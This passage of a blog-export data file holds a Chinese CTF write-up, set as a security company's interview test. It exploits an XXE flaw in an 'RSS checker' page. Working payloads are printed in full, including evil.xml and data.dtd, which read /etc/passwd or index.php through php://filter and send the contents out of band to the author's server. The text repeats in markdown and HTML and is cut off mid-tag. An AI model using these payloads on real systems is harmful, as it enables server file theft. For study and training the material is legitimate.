src=\"/2019/02/28/文件与目录权限/QQ截图20190228101906.png\" alt></p>\n<ul>\n<li><strong>要操作一个目录下的文件，拥有进入该目录的权限是必需的，“x”权限相当于key。“r”权限不是必需的，就像摸黑到书房取书，进入书房的钥匙是必需的，但是可以不用看到书架上的书名。没有“r”权限，命令里路径将不能补全。</strong></li>\n<li><strong>因此在搭建WEB服务器时，运行HTTP服务的用户对网站的根目录应该具有”rx”权限。具体权限配置可参考连接：</strong><a href=\"https://www.cnblogs.com/sochishun/p/7413572.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/sochishun/p/7413572.html</a></li>\n</ul>\n<p><strong>改变文件权限：</strong></p>\n<p><img src=\"/2019/02/28/文件与目录权限/QQ截图20190228105825.png\" alt></p>"},{"title":"记一次面试某安全公司一道XXE漏洞CTF面试题","date":"2019-03-15T07:54:09.000Z","_content":"\n### 0x00 说在前面的话\n\n最近面试一家安全公司，拿到一套CTF题目作为面试前的技术能力测试。其中有一道XEE漏洞的题目，碰巧最近正在研究学习XXE漏洞，过程中遇到了一些坑，隧做个记录。\n\n下面直接进入主题...\n\n<!-- more -->\n\n### 0x01 正文\n\n#### 1.起步\n\n首先，点击题目链接进入，发现是一个RSS checker的页面，页面有一个输入框要求输入URL地址，直接随意输入一个地址，点击提交查询。\n\n![](记一次面试某安全公司一道XXE漏洞CTF面试题\\00.png)\n\n提交后返回XML文档无效“XML document is not valid”的信息，由此可以知道此处应该是需要我们提供一个XML文档的URL地址。既然是XML文档，那么首先考虑到的存在XEE漏洞。\n\n#### 2.漏洞验证\n\n接下来就是要验证是否存在XXE漏洞，确定漏洞存在的根本是要证明目标服务器允许外部实体。所以证明的整体思路为：\n\n> 1.让目标服务器访问请求我们提供的XML文档。\n>\n> 2.我们提供的XML文档中使用了外部实体。\n>\n> 3.若我们的XML文档中的外部实体被解析了，则证明漏洞存在。\n\n首先，要让目标服务器请求我们的XML文档的话，我们得先有一台外网服务器，话不多说，直接去搞一个腾讯云学生服务器。\n\n搞定了服务器后，直接在服务器上创建一个XML文档，命名为evil.xml，内容如下：\n\n```\n<?xml version=\"1.0\"?> \n<!DOCTYPE ANY [ \n<!ENTITY % test SYSTEM \"http://148.x.x.141/xxe_test\">\n%test;\n]>\n```\n\n![](记一次面试某安全公司一道XXE漏洞CTF面试题\\01testxml.png)\n\n接着为了让目标服务器可以获取我们的evil.xml，我们需要一个HTTP服务器。直接使用Python建立一个简单的WEB服务，输入命令：`python -m SimpleHTTPServer 80`。这样我们的服务器就会开启一个监听在80端口的HTTP服务。\n\n![](记一次面试某安全公司一道XXE漏洞CTF面试题\\QQ截图20190315163014.png)\n\n再接下来就是要让目标服务器请求我们的evil.xml了，在网页输入我们evil.xml的URL然后点击提交查询，然后观察我们服务器上HTTP服务的访问情况。\n\n![](记一次面试某安全公司一道XXE漏洞CTF面试题\\02prove.png)\n\n在上图中，可以看到目标服务器向我们的服务器发起了两次请求，第一次请求evil.xml文档。第二次请求了`/xxe_test`，这正是我们在evil.xml中定义的引用外部实体。简单说就是我们在网页上输入我们的evil.xml的URL地址，目标服务器不但请求了我们的evil.xml文档，还解析执行了evil.xml的内容。evil.xml中`<!ENTITY % test SYSTEM \"http://148.x.x.141/xxe_test\">`就是外部实体，若允许外部实体，这条语句就会执行，执行的结果就是向`http://148.x.x.141/xxe_test`(即我们的服务器)发起请求。我们在服务器上看到该请求，也就证明目标服务器允许外部实体，也即存在XXE漏洞。\n\n#### 3.漏洞利用\n\n确定了漏洞的存在，接下来就是利用漏洞搞事。XXE最常见的利用方式就是进行任意文件读取。获取敏感重要文件的内容。\n\n读取文件之前我们需要确定以什么方式读取：直接回显还是带外通道。\n\n直接回显即目标服务器会把结果直接放于响应页面中返回。观察响应页面就只有XML文档有效或无效的信息。显然我们只能采取带外通道读取的方式。读取文件的大概思路如下：\n\n> 1.确定要读取的文件，如/etc/passwd。\n>\n> 2.再创建一个文件，文件内容是定义实体，具体内容见下面。\n>\n> 3.修改evil.xml的内容，并将上一步创建的文件引用进来，具体内容见下面。\n\n首先，我们先尝试读取目标服务器的`/etc/passwd`文件。evil.xml文件内容为：\n\n```xml-dtd\n<?xml version=\"1.0\"?> \n<!DOCTYPE ANY [ \n<!ENTITY % file SYSTEM \"php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % dtd SYSTEM \"http://148.70.34.141/data.dtd\">\n%dtd; %payload; %send;\n]>\n```\n\n- 第3行作用是读取`/etc/passwd`文件内容，并使用php filter将内容进行压缩及Base64编码。\n\n- 第4行引用了另一个文件，文件名为data.dtd，文件的内容如下：\n\n  ```xml-dtd\n  <!ENTITY % payload \"<!ENTITY &#37; send SYSTEM 'http://148.70.34.141/?data=%file;'>\">\n  ```\n\n  - 该文件定义了一个实体，实体的内容又定义了另一个实体，内层实体的作用是将第三行压缩打包的内容作为HTTP请求参数发送到我们的HTTP服务器上。\n  - `&#37;`是`%`的实体，内层的实体的`%`必须要使用实体形式，否则是不能解析的。\n  - 之所以还需要创建该文件，而不能将该文件内容直接定义在evil.xml中，是因为直接在evil.xml中定义是不生效的，不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。\n\n- 大概梳理一下两个文件的实体解析过程：\n\n  > 1. `%dtd;`会执行evil.xml的第3行，执行的结果是引用了`data.dtd`文件，可以简单认为将`data.dtd`的文件内容替换`%dtd;`。\n  >\n  > 2. `%payload;`执行的就是`data.dtd`的内容，可简单认为，`%payload;`会被`<!ENTITY &#37; send SYSTEM 'http://148.70.34.141/?data=%file;'>`进行替换。\n  > 3. `%send;`会向`http://148.70.34.141/?data=%file;`发起请求，而发起请求前，`%file;`也会被解析，被压缩加密的`/etc/passwd`文件内容进行替换。\n\n编写好Payload文件之后，继续之前的操作，让目标服务器请求我们的evil.xml文件。\n\n![](记一次面试某安全公司一道XXE漏洞CTF面试题\\04readpasswd.png)\n\n并没有成功读取`/etc/passwd`，而是报错了，根据错误信息我们可以知道，目标服务器对允许读取的路径进行了权限控制，只允许读取的路径为：`/challenge/web-serveur/ch29`。\n\n那么我们只能读取其他文件了，根据错误信息我们还可以知道，被允许读取的路径下，存在一个`index.php`文件，尝试读取该文件，只需要的evil.xml文件中的`/etc/passwd`改为`./index.php`（允许使用相对路径）即可。\n\n修改好evil.xml文件后，继续让目标服务器请求。发现被压缩加密的`index.php`文件内容被成功发送到我们的服务器。\n\n![](记一次面试某安全公司一道XXE漏洞CTF面试题\\06readindex.png)\n\n接下来就是将压缩编码内容进行解压解码。此处可以编写一个接收的页面进行解压解码。由于环境原因，我的操作是将压缩编码的文件内容复制保存到一个文件中，文件名tmp.txt。然后创建一个php文件，内容为：\n\n```php\n<?php \necho file_get_contents(\"php://filter/read=convert.base64-decode/zlib.inflate/resource=tmp.txt\");\n?>\n```\n\n将该php文件放到phpstudy的web根目录下并访问，就可以在页面中找到flag。\n\n![](记一次面试某安全公司一道XXE漏洞CTF面试题\\flag.png)\n\n### 0x03 总结\n\n做下来之后，题目的难度不算高，但是期间遇到了一个坑，感觉payload什么的都设置的没有问题了，但是一直读取不了文件，为此花了很长时间，最终查了一下资料才知道，使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错。\n\n刚开始使用的是：`php://filter/read=convert.base64-decode/resource=`，只对文件内容进行编码，所以文件过大无法发送。后面使用：`php://filter/read=convert.base64-decode/zlib.inflate/resource=`进行压缩编码才成功读取。\n\n> 压缩及编码：`echo file_get_contents(\"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\");`\n> 解压及解码：`echo file_get_contents(\"php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1\");`\n\n**参考链接：**\n\nhttps://xz.aliyun.com/t/3357","source":"_posts/记一次面试某安全公司一道XXE漏洞CTF面试题.md","raw":"---\ntitle: 记一次面试某安全公司一道XXE漏洞CTF面试题\ndate: 2019-03-15 15:54:09\ntags: \n\t- XXE\n\t- CTF\ncategories: \n---\n\n### 0x00 说在前面的话\n\n最近面试一家安全公司，拿到一套CTF题目作为面试前的技术能力测试。其中有一道XEE漏洞的题目，碰巧最近正在研究学习XXE漏洞，过程中遇到了一些坑，隧做个记录。\n\n下面直接进入主题...\n\n<!-- more -->\n\n### 0x01 正文\n\n#### 1.起步\n\n首先，点击题目链接进入，发现是一个RSS checker的页面，页面有一个输入框要求输入URL地址，直接随意输入一个地址，点击提交查询。\n\n![](记一次面试某安全公司一道XXE漏洞CTF面试题\\00.png)\n\n提交后返回XML文档无效“XML document is not valid”的信息，由此可以知道此处应该是需要我们提供一个XML文档的URL地址。既然是XML文档，那么首先考虑到的存在XEE漏洞。\n\n#### 2.漏洞验证\n\n接下来就是要验证是否存在XXE漏洞，确定漏洞存在的根本是要证明目标服务器允许外部实体。所以证明的整体思路为：\n\n> 1.让目标服务器访问请求我们提供的XML文档。\n>\n> 2.我们提供的XML文档中使用了外部实体。\n>\n> 3.若我们的XML文档中的外部实体被解析了，则证明漏洞存在。\n\n首先，要让目标服务器请求我们的XML文档的话，我们得先有一台外网服务器，话不多说，直接去搞一个腾讯云学生服务器。\n\n搞定了服务器后，直接在服务器上创建一个XML文档，命名为evil.xml，内容如下：\n\n```\n<?xml version=\"1.0\"?> \n<!DOCTYPE ANY [ \n<!ENTITY % test SYSTEM \"http://148.x.x.141/xxe_test\">\n%test;\n]>\n```\n\n![](记一次面试某安全公司一道XXE漏洞CTF面试题\\01testxml.png)\n\n接着为了让目标服务器可以获取我们的evil.xml，我们需要一个HTTP服务器。直接使用Python建立一个简单的WEB服务，输入命令：`python -m SimpleHTTPServer 80`。这样我们的服务器就会开启一个监听在80端口的HTTP服务。\n\n![](记一次面试某安全公司一道XXE漏洞CTF面试题\\QQ截图20190315163014.png)\n\n再接下来就是要让目标服务器请求我们的evil.xml了，在网页输入我们evil.xml的URL然后点击提交查询，然后观察我们服务器上HTTP服务的访问情况。\n\n![](记一次面试某安全公司一道XXE漏洞CTF面试题\\02prove.png)\n\n在上图中，可以看到目标服务器向我们的服务器发起了两次请求，第一次请求evil.xml文档。第二次请求了`/xxe_test`，这正是我们在evil.xml中定义的引用外部实体。简单说就是我们在网页上输入我们的evil.xml的URL地址，目标服务器不但请求了我们的evil.xml文档，还解析执行了evil.xml的内容。evil.xml中`<!ENTITY % test SYSTEM \"http://148.x.x.141/xxe_test\">`就是外部实体，若允许外部实体，这条语句就会执行，执行的结果就是向`http://148.x.x.141/xxe_test`(即我们的服务器)发起请求。我们在服务器上看到该请求，也就证明目标服务器允许外部实体，也即存在XXE漏洞。\n\n#### 3.漏洞利用\n\n确定了漏洞的存在，接下来就是利用漏洞搞事。XXE最常见的利用方式就是进行任意文件读取。获取敏感重要文件的内容。\n\n读取文件之前我们需要确定以什么方式读取：直接回显还是带外通道。\n\n直接回显即目标服务器会把结果直接放于响应页面中返回。观察响应页面就只有XML文档有效或无效的信息。显然我们只能采取带外通道读取的方式。读取文件的大概思路如下：\n\n> 1.确定要读取的文件，如/etc/passwd。\n>\n> 2.再创建一个文件，文件内容是定义实体，具体内容见下面。\n>\n> 3.修改evil.xml的内容，并将上一步创建的文件引用进来，具体内容见下面。\n\n首先，我们先尝试读取目标服务器的`/etc/passwd`文件。evil.xml文件内容为：\n\n```xml-dtd\n<?xml version=\"1.0\"?> \n<!DOCTYPE ANY [ \n<!ENTITY % file SYSTEM \"php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % dtd SYSTEM \"http://148.70.34.141/data.dtd\">\n%dtd; %payload; %send;\n]>\n```\n\n- 第3行作用是读取`/etc/passwd`文件内容，并使用php filter将内容进行压缩及Base64编码。\n\n- 第4行引用了另一个文件，文件名为data.dtd，文件的内容如下：\n\n  ```xml-dtd\n  <!ENTITY % payload \"<!ENTITY &#37; send SYSTEM 'http://148.70.34.141/?data=%file;'>\">\n  ```\n\n  - 该文件定义了一个实体，实体的内容又定义了另一个实体，内层实体的作用是将第三行压缩打包的内容作为HTTP请求参数发送到我们的HTTP服务器上。\n  - `&#37;`是`%`的实体，内层的实体的`%`必须要使用实体形式，否则是不能解析的。\n  - 之所以还需要创建该文件，而不能将该文件内容直接定义在evil.xml中，是因为直接在evil.xml中定义是不生效的，不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。\n\n- 大概梳理一下两个文件的实体解析过程：\n\n  > 1. `%dtd;`会执行evil.xml的第3行，执行的结果是引用了`data.dtd`文件，可以简单认为将`data.dtd`的文件内容替换`%dtd;`。\n  >\n  > 2. `%payload;`执行的就是`data.dtd`的内容，可简单认为，`%payload;`会被`<!ENTITY &#37; send SYSTEM 'http://148.70.34.141/?data=%file;'>`进行替换。\n  > 3. `%send;`会向`http://148.70.34.141/?data=%file;`发起请求，而发起请求前，`%file;`也会被解析，被压缩加密的`/etc/passwd`文件内容进行替换。\n\n编写好Payload文件之后，继续之前的操作，让目标服务器请求我们的evil.xml文件。\n\n![](记一次面试某安全公司一道XXE漏洞CTF面试题\\04readpasswd.png)\n\n并没有成功读取`/etc/passwd`，而是报错了，根据错误信息我们可以知道，目标服务器对允许读取的路径进行了权限控制，只允许读取的路径为：`/challenge/web-serveur/ch29`。\n\n那么我们只能读取其他文件了，根据错误信息我们还可以知道，被允许读取的路径下，存在一个`index.php`文件，尝试读取该文件，只需要的evil.xml文件中的`/etc/passwd`改为`./index.php`（允许使用相对路径）即可。\n\n修改好evil.xml文件后，继续让目标服务器请求。发现被压缩加密的`index.php`文件内容被成功发送到我们的服务器。\n\n![](记一次面试某安全公司一道XXE漏洞CTF面试题\\06readindex.png)\n\n接下来就是将压缩编码内容进行解压解码。此处可以编写一个接收的页面进行解压解码。由于环境原因，我的操作是将压缩编码的文件内容复制保存到一个文件中，文件名tmp.txt。然后创建一个php文件，内容为：\n\n```php\n<?php \necho file_get_contents(\"php://filter/read=convert.base64-decode/zlib.inflate/resource=tmp.txt\");\n?>\n```\n\n将该php文件放到phpstudy的web根目录下并访问，就可以在页面中找到flag。\n\n![](记一次面试某安全公司一道XXE漏洞CTF面试题\\flag.png)\n\n### 0x03 总结\n\n做下来之后，题目的难度不算高，但是期间遇到了一个坑，感觉payload什么的都设置的没有问题了，但是一直读取不了文件，为此花了很长时间，最终查了一下资料才知道，使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错。\n\n刚开始使用的是：`php://filter/read=convert.base64-decode/resource=`，只对文件内容进行编码，所以文件过大无法发送。后面使用：`php://filter/read=convert.base64-decode/zlib.inflate/resource=`进行压缩编码才成功读取。\n\n> 压缩及编码：`echo file_get_contents(\"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\");`\n> 解压及解码：`echo file_get_contents(\"php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1\");`\n\n**参考链接：**\n\nhttps://xz.aliyun.com/t/3357","slug":"记一次面试某安全公司一道XXE漏洞CTF面试题","published":1,"updated":"2019-03-22T03:59:12.551Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83lg003a7or0mqzxxsrx","content":"<h3 id=\"0x00-说在前面的话\"><a href=\"#0x00-说在前面的话\" class=\"headerlink\" title=\"0x00 说在前面的话\"></a>0x00 说在前面的话</h3><p>最近面试一家安全公司，拿到一套CTF题目作为面试前的技术能力测试。其中有一道XEE漏洞的题目，碰巧最近正在研究学习XXE漏洞，过程中遇到了一些坑，隧做个记录。</p>\n<p>下面直接进入主题…</p>\n<a id=\"more\"></a>\n<h3 id=\"0x01-正文\"><a href=\"#0x01-正文\" class=\"headerlink\" title=\"0x01 正文\"></a>0x01 正文</h3><h4 id=\"1-起步\"><a href=\"#1-起步\" class=\"headerlink\" title=\"1.起步\"></a>1.起步</h4><p>首先，点击题目链接进入，发现是一个RSS checker的页面，页面有一个输入框要求输入URL地址，直接随意输入一个地址，点击提交查询。</p>\n<p><img src=\"/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/00.png\" alt></p>\n<p>提交后返回XML文档无效“XML document is not valid”的信息，由此可以知道此处应该是需要我们提供一个XML文档的URL地址。既然是XML文档，那么首先考虑到的存在XEE漏洞。</p>\n<h4 id=\"2-漏洞验证\"><a href=\"#2-漏洞验证\" class=\"headerlink\" title=\"2.漏洞验证\"></a>2.漏洞验证</h4><p>接下来就是要验证是否存在XXE漏洞，确定漏洞存在的根本是要证明目标服务器允许外部实体。所以证明的整体思路为：</p>\n<blockquote>\n<p>1.让目标服务器访问请求我们提供的XML文档。</p>\n<p>2.我们提供的XML文档中使用了外部实体。</p>\n<p>3.若我们的XML文档中的外部实体被解析了，则证明漏洞存在。</p>\n</blockquote>\n<p>首先，要让目标服务器请求我们的XML文档的话，我们得先有一台外网服务器，话不多说，直接去搞一个腾讯云学生服务器。</p>\n<p>搞定了服务器后，直接在服务器上创建一个XML文档，命名为evil.xml，内容如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class=\"line\">&lt;!DOCTYPE ANY [ </span><br><span class=\"line\">&lt;!ENTITY % test SYSTEM &quot;http://148.x.x.141/xxe_test&quot;&gt;</span><br><span class=\"line\">%test;</span><br><span class=\"line\">]&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/01testxml.png\" alt></p>\n<p>接着为了让目标服务器可以获取我们的evil.xml，我们需要一个HTTP服务器。直接使用Python建立一个简单的WEB服务，输入命令：<code>python -m SimpleHTTPServer 80</code>。这样我们的服务器就会开启一个监听在80端口的HTTP服务。</p>\n<p><img src=\"/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/QQ截图20190315163014.png\" alt></p>\n<p>再接下来就是要让目标服务器请求我们的evil.xml了，在网页输入我们evil.xml的URL然后点击提交查询，然后观察我们服务器上HTTP服务的访问情况。</p>\n<p><img src=\"/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/02prove.png\" alt></p>\n<p>在上图中，可以看到目标服务器向我们的服务器发起了两次请求，第一次请求evil.xml文档。第二次请求了<code>/xxe_test</code>，这正是我们在evil.xml中定义的引用外部实体。简单说就是我们在网页上输入我们的evil.xml的URL地址，目标服务器不但请求了我们的evil.xml文档，还解析执行了evil.xml的内容。evil.xml中<code>&lt;!ENTITY % test SYSTEM &quot;http://148.x.x.141/xxe_test&quot;&gt;</code>就是外部实体，若允许外部实体，这条语句就会执行，执行的结果就是向<code>http://148.x.x.141/xxe_test</code>(即我们的服务器)发起请求。我们在服务器上看到该请求，也就证明目标服务器允许外部实体，也即存在XXE漏洞。</p>\n<h4 id=\"3-漏洞利用\"><a href=\"#3-漏洞利用\" class=\"headerlink\" title=\"3.漏洞利用\"></a>3.漏洞利用</h4><p>确定了漏洞的存在，接下来就是利用漏洞搞事。XXE最常见的利用方式就是进行任意文件读取。获取敏感重要文件的内容。</p>\n<p>读取文件之前我们需要确定以什么方式读取：直接回显还是带外通道。</p>\n<p>直接回显即目标服务器会把结果直接放于响应页面中返回。观察响应页面就只有XML文档有效或无效的信息。显然我们只能采取带外通道读取的方式。读取文件的大概思路如下：</p>\n<blockquote>\n<p>1.确定要读取的文件，如/etc/passwd。</p>\n<p>2.再创建一个文件，文件内容是定义实体，具体内容见下面。</p>\n<p>3.修改evil.xml的内容，并将上一步创建的文件引用进来，具体内容见下面。</p>\n</blockquote>\n<p>首先，我们先尝试读取目标服务器的<code>/etc/passwd</code>文件。evil.xml文件内容为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class=\"line\">&lt;!DOCTYPE ANY [ </span><br><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % dtd SYSTEM &quot;http://148.70.34.141/data.dtd&quot;&gt;</span><br><span class=\"line\">%dtd; %payload; %send;</span><br><span class=\"line\">]&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>第3行作用是读取<code>/etc/passwd</code>文件内容，并使用php filter将内容进行压缩及Base64编码。</p>\n</li>\n<li><p>第4行引用了另一个文件，文件名为data.dtd，文件的内容如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://148.70.34.141/?data=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>该文件定义了一个实体，实体的内容又定义了另一个实体，内层实体的作用是将第三行压缩打包的内容作为HTTP请求参数发送到我们的HTTP服务器上。</li>\n<li><code>&amp;#37;</code>是<code>%</code>的实体，内层的实体的<code>%</code>必须要使用实体形式，否则是不能解析的。</li>\n<li>之所以还需要创建该文件，而不能将该文件内容直接定义在evil.xml中，是因为直接在evil.xml中定义是不生效的，不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</li>\n</ul>\n</li>\n<li><p>大概梳理一下两个文件的实体解析过程：</p>\n<blockquote>\n<ol>\n<li><p><code>%dtd;</code>会执行evil.xml的第3行，执行的结果是引用了<code>data.dtd</code>文件，可以简单认为将<code>data.dtd</code>的文件内容替换<code>%dtd;</code>。</p>\n</li>\n<li><p><code>%payload;</code>执行的就是<code>data.dtd</code>的内容，可简单认为，<code>%payload;</code>会被<code>&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://148.70.34.141/?data=%file;&#39;&gt;</code>进行替换。</p>\n</li>\n<li><code>%send;</code>会向<code>http://148.70.34.141/?data=%file;</code>发起请求，而发起请求前，<code>%file;</code>也会被解析，被压缩加密的<code>/etc/passwd</code>文件内容进行替换。</li>\n</ol>\n</blockquote>\n</li>\n</ul>\n<p>编写好Payload文件之后，继续之前的操作，让目标服务器请求我们的evil.xml文件。</p>\n<p><img src=\"/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/04readpasswd.png\" alt></p>\n<p>并没有成功读取<code>/etc/passwd</code>，而是报错了，根据错误信息我们可以知道，目标服务器对允许读取的路径进行了权限控制，只允许读取的路径为：<code>/challenge/web-serveur/ch29</code>。</p>\n<p>那么我们只能读取其他文件了，根据错误信息我们还可以知道，被允许读取的路径下，存在一个<code>index.php</code>文件，尝试读取该文件，只需要的evil.xml文件中的<code>/etc/passwd</code>改为<code>./index.php</code>（允许使用相对路径）即可。</p>\n<p>修改好evil.xml文件后，继续让目标服务器请求。发现被压缩加密的<code>index.php</code>文件内容被成功发送到我们的服务器。</p>\n<p><img src=\"/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/06readindex.png\" alt></p>\n<p>接下来就是将压缩编码内容进行解压解码。此处可以编写一个接收的页面进行解压解码。由于环境原因，我的操作是将压缩编码的文件内容复制保存到一个文件中，文件名tmp.txt。然后创建一个php文件，内容为：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"keyword\">echo</span> file_get_contents(<span class=\"string\">\"php://filter/read=convert.base64-decode/zlib.inflate/resource=tmp.txt\"</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>将该php文件放到phpstudy的web根目录下并访问，就可以在页面中找到flag。</p>\n<p><img src=\"/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/flag.png\" alt></p>\n<h3 id=\"0x03-总结\"><a href=\"#0x03-总结\" class=\"headerlink\" title=\"0x03 总结\"></a>0x03 总结</h3><p>做下来之后，题目的难度不算高，但是期间遇到了一个坑，感觉payload什么的都设置的没有问题了，但是一直读取不了文件，为此花了很长时间，最终查了一下资料才知道，使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错。</p>\n<p>刚开始使用的是：<code>php://filter/read=convert.base64-decode/resource=</code>，只对文件内容进行编码，所以文件过大无法发送。后面使用：<code>php://filter/read=convert.base64-decode/zlib.inflate/resource=</code>进行压缩编码才成功读取。</p>\n<blockquote>\n<p>压缩及编码：<code>echo file_get_contents(&quot;php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&quot;);</code><br>解压及解码：<code>echo file_get_contents(&quot;php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1&quot;);</code></p>\n</blockquote>\n<p><strong>参考链接：</strong></p>\n<p><a href=\"https://xz.aliyun.com/t/3357\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/3357</a></p>\n","site":{"data":{}},"excerpt":"<h3 id=\"0x00-说在前面的话\"><a href=\"#0x00-说在前面的话\" class=\"headerlink\" title=\"0x00 说在前面的话\"></a>0x00 说在前面的话</h3><p>最近面试一家安全公司，拿到一套CTF题目作为面试前的技术能力测试。其中有一道XEE漏洞的题目，碰巧最近正在研究学习XXE漏洞，过程中遇到了一些坑，隧做个记录。</p>\n<p>下面直接进入主题…</p>","more":"<h3 id=\"0x01-正文\"><a href=\"#0x01-正文\" class=\"headerlink\" title=\"0x01 正文\"></a>0x01 正文</h3><h4 id=\"1-起步\"><a href=\"#1-起步\" class=\"headerlink\" title=\"1.起步\"></a>1.起步</h4><p>首先，点击题目链接进入，发现是一个RSS checker的页面，页面有一个输入框要求输入URL地址，直接随意输入一个地址，点击提交查询。</p>\n<p><img src=\"/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/00.png\" alt></p>\n<p>提交后返回XML文档无效“XML document is not valid”的信息，由此可以知道此处应该是需要我们提供一个XML文档的URL地址。既然是XML文档，那么首先考虑到的存在XEE漏洞。</p>\n<h4 id=\"2-漏洞验证\"><a href=\"#2-漏洞验证\" class=\"headerlink\" title=\"2.漏洞验证\"></a>2.漏洞验证</h4><p>接下来就是要验证是否存在XXE漏洞，确定漏洞存在的根本是要证明目标服务器允许外部实体。所以证明的整体思路为：</p>\n<blockquote>\n<p>1.让目标服务器访问请求我们提供的XML文档。</p>\n<p>2.我们提供的XML文档中使用了外部实体。</p>\n<p>3.若我们的XML文档中的外部实体被解析了，则证明漏洞存在。</p>\n</blockquote>\n<p>首先，要让目标服务器请求我们的XML文档的话，我们得先有一台外网服务器，话不多说，直接去搞一个腾讯云学生服务器。</p>\n<p>搞定了服务器后，直接在服务器上创建一个XML文档，命名为evil.xml，内容如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class=\"line\">&lt;!DOCTYPE ANY [ </span><br><span class=\"line\">&lt;!ENTITY % test SYSTEM &quot;http://148.x.x.141/xxe_test&quot;&gt;</span><br><span class=\"line\">%test;</span><br><span class=\"line\">]&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/01testxml.png\" alt></p>\n<p>接着为了让目标服务器可以获取我们的evil.xml，我们需要一个HTTP服务器。直接使用Python建立一个简单的WEB服务，输入命令：<code>python -m SimpleHTTPServer 80</code>。这样我们的服务器就会开启一个监听在80端口的HTTP服务。</p>\n<p><img src=\"/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/QQ截图20190315163014.png\" alt></p>\n<p>再接下来就是要让目标服务器请求我们的evil.xml了，在网页输入我们evil.xml的URL然后点击提交查询，然后观察我们服务器上HTTP服务的访问情况。</p>\n<p><img src=\"/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/02prove.png\" alt></p>\n<p>在上图中，可以看到目标服务器向我们的服务器发起了两次请求，第一次请求evil.xml文档。第二次请求了<code>/xxe_test</code>，这正是我们在evil.xml中定义的引用外部实体。简单说就是我们在网页上输入我们的evil.xml的URL地址，目标服务器不但请求了我们的evil.xml文档，还解析执行了evil.xml的内容。evil.xml中<code>&lt;!ENTITY % test SYSTEM &quot;http://148.x.x.141/xxe_test&quot;&gt;</code>就是外部实体，若允许外部实体，这条语句就会执行，执行的结果就是向<code>http://148.x.x.141/xxe_test</code>(即我们的服务器)发起请求。我们在服务器上看到该请求，也就证明目标服务器允许外部实体，也即存在XXE漏洞。</p>\n<h4 id=\"3-漏洞利用\"><a href=\"#3-漏洞利用\" class=\"headerlink\" 